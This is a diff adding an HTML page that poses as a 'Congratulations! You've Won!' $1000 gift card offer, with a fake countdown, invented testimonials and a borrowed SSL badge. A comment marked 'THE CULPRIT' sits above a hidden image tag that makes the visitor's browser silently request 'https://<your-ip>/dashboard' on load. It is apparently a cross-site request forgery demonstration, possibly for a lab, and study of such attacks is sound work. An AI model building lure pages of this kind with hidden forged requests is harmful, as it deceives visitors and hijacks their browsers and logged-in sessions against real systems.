@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! You've Won!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(to right, #ffcc00, #ff3300);
+            color: white;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            color: black;
+            padding: 20px;
+            max-width: 500px;
+            margin: auto;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            animation: shake 0.5s infinite alternate;
+        }
+        @keyframes shake {
+            0% { transform: translateX(2px); }
+            100% { transform: translateX(-2px); }
+        }
+        .header {
+            font-size: 24px;
+            font-weight: bold;
+            color: red;
+            text-transform: uppercase;
+        }
+        .countdown {
+            font-size: 20px;
+            font-weight: bold;
+            color: #d9534f;
+        }
+        .claim-button {
+            display: block;
+            margin: 20px auto;
+            padding: 15px;
+            background: red;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0% { background: red; }
+            50% { background: yellow; }
+            100% { background: red; }
+        }
+        .testimonials, .trust-badges {
+            margin-top: 20px;
+        }
+        .trust-badges img {
+            width: 80px;
+            margin: 10px;
+        }
+        .hidden-img {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">🎉 Congratulations! 🎉</div>
+        <p>You have been selected to receive a FREE $1000 Gift Card!</p>
+        <p>Hurry! This offer expires in:</p>
+        <div class="countdown" id="timer">02:00</div>
+        <button class="claim-button">Claim Your Gift Now</button>
+        <div class="testimonials">
+            <p><b>"I got my free gift card in just 5 minutes!" - Sarah J.</b></p>
+            <p><b>"Best offer ever! Thank you!" - John Pork</b></p>
+        </div>
+        <div class="trust-badges">
+            <a href="https://www.freeiconspng.com/img/15248" title="Image from freeiconspng.com">
+                <img src="https://www.freeiconspng.com/uploads/ssl-encryption-icon-14.jpg" width="350" alt="Icon Ssl Encryption Image Free" />
+            </a>
+        </div>
+    </div>
+
+    <!-- !THE CULPRIT -->
+    <img class="hidden-img" src="https://<your-ip>/dashboard" alt="Hidden Request">
+
+    <script>
+        // handles the countdown timer
+        let timeLeft = 120;
+        function updateTimer() {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            document.getElementById("timer").textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                document.getElementById("timer").textContent = "Expired!";
+            }
+        }
+        updateTimer();
+    </script>
+</body>
+</html>
